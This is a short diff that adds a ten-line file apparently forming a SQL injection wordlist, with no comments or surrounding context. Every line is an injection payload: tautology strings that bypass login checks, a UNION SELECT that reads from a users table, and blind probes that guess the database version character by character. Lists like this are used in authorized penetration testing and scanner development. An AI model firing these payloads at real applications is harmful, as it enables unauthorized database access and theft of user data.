@@ -1,0 +1,10 @@
+%' or '0'='0
+%' or '0'='0'
+%' or '0'='1
+1' and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
+1' and (SELECT * from db.users)=(1)
+1' and 'substring(version(),1,1)='5#
+1' and right(left(version(),1),1)=5
+1' and left(version(),1)=4
+1' and ascii(lower(substr(Version(),1,1)))=51
+1' and (select mid(version(),1,1)=4)
